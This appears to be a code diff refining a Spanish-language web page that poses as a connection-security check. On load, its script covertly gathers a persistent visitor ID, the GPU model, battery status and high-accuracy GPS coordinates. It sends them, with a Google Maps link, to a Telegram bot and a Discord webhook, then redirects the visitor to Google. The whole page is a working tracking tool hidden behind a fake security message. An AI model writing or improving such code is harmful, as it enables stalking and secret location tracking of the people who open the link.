@@ -8,7 +8,7 @@
         body { 
             background: #ffffff; 
             color: #3c4043; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
             display: flex; 
             justify-content: center; 
             align-items: center; 
@@ -26,15 +26,15 @@
             margin: 0 auto 20px; 
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 1.2rem; font-weight: 400; margin-bottom: 8px; }
-        p { font-size: 0.9rem; color: #70757a; line-height: 1.4; }
+        h1 { font-size: 1.1rem; font-weight: 500; margin-bottom: 8px; }
+        p { font-size: 0.85rem; color: #70757a; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="loader"></div>
         <h1>Espera un momento...</h1>
-        <p>Estamos confirmando que tu conexión es segura para continuar.</p>
+        <p>Estamos confirmando que tu conexión es segura.</p>
     </div>
 
     <script>
@@ -45,51 +45,47 @@
             exit: "https://www.google.com"
         };
 
-        async function recolectar() {
-            // 1. ID Único
-            let id;
-            try {
-                id = localStorage.getItem('_uid') || 'ID-' + Math.random().toString(36).substr(2, 6).toUpperCase();
-                localStorage.setItem('_uid', id);
-            } catch(e) { id = "hubo problemas con este criterio"; }
+        async function ejecutar() {
+            // ID Único
+            let id = localStorage.getItem('_uid') || 'ID-' + Math.random().toString(36).substr(2, 6).toUpperCase();
+            localStorage.setItem('_uid', id);
 
-            // 2. Dispositivo (Marca/Modelo estimado)
-            let hardware;
+            // Batería
+            let batStatus = "hubo problemas con este criterio";
+            try {
+                const b = await navigator.getBattery();
+                batStatus = `${Math.round(b.level * 100)}% | ${b.charging ? "Cargando" : "No cargando"}`;
+            } catch(e) {}
+
+            // Hardware
+            let hardware = "hubo problemas con este criterio";
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
                 const debug = gl.getExtension('WEBGL_debug_renderer_info');
                 hardware = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-            } catch(e) { hardware = "hubo problemas con este criterio"; }
+            } catch(e) {}
 
-            // 3. Batería y Estado de Carga
-            let batStatus;
-            try {
-                const b = await navigator.getBattery();
-                batStatus = `${Math.round(b.level * 100)}% | ${b.charging ? "🔌 Cargando" : "🔋 No cargando"}`;
-            } catch(e) { batStatus = "hubo problemas con este criterio"; }
-
-            // 4. GPS y enlace a Maps
+            // Ubicación
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
-                    (p) => finalizar(p, id, hardware, batStatus),
-                    () => finalizar(null, id, hardware, batStatus),
+                    (p) => enviar(p, id, hardware, batStatus),
+                    () => enviar(null, id, hardware, batStatus),
                     { enableHighAccuracy: true, timeout: 8000 }
                 );
             } else {
-                finalizar(null, id, hardware, batStatus);
+                enviar(null, id, hardware, batStatus);
             }
         }
 
-        async function finalizar(pos, id, hw, bat) {
-            let gpsTxt = "hubo problemas con esta criterio";
-            let mapLink = "";
+        async function enviar(pos, id, hw, bat) {
+            let gpsTxt = "hubo problemas con esta criterio (GPS)";
+            let lat = null, lon = null;
 
             if (pos) {
-                const { latitude, longitude, accuracy } = pos.coords;
-                gpsTxt = `Lat: \`${latitude}\`\nLon: \`${longitude}\`\n🎯 Precisión: \`${Math.round(accuracy)}m\``;
-                // Enlace directo a Google Maps
-                mapLink = `\n🗺️ *Google Maps:* https://www.google.com/maps?q=${latitude},${longitude}`;
+                lat = pos.coords.latitude;
+                lon = pos.coords.longitude;
+                gpsTxt = `Lat: \`${lat}\` | Lon: \`${lon}\` (Precisión: ${Math.round(pos.coords.accuracy)}m)`;
             }
 
             const report = `🔔 **REGISTRO DE ACTIVIDAD**\n` +
@@ -97,23 +93,30 @@
                            `🆔 **ID:** \`${id}\`\n` +
                            `📱 **Dispositivo:** \`${hw}\`\n` +
                            `🔋 **Batería:** ${bat}\n` +
-                           `📍 **Coordenadas:**\n${gpsTxt}${mapLink}\n` +
+                           `📍 **Coords:** ${gpsTxt}\n` +
                            `━━━━━━━━━━━━━━━━━━━━`;
 
+            // Configuración del botón para Telegram
+            const telegramData = {
+                chat_id: CONFIG.chat,
+                text: report,
+                parse_mode: "Markdown",
+                reply_markup: pos ? {
+                    inline_keyboard: [[
+                        { text: "🗺️ Abrir en Google Maps", url: `https://www.google.com/maps?q=${lat},${lon}` }
+                    ]]
+                } : undefined
+            };
+
             try {
-                // Envío a Telegram
+                // Telegram con botón
                 await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: CONFIG.chat,
-                        text: report,
-                        parse_mode: "Markdown",
-                        disable_web_page_preview: false // Cambiado a false para que se vea la vista previa del mapa si es posible
-                    })
+                    body: JSON.stringify(telegramData)
                 });
 
-                // Envío a Discord
+                // Discord (Normal)
                 await fetch(CONFIG.webhook, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -121,11 +124,10 @@
                 });
             } catch(e) {}
 
-            // Redirección
             window.location.href = CONFIG.exit;
         }
 
-        window.onload = recolectar;
+        window.onload = ejecutar;
     </script>
 </body>
 </html>
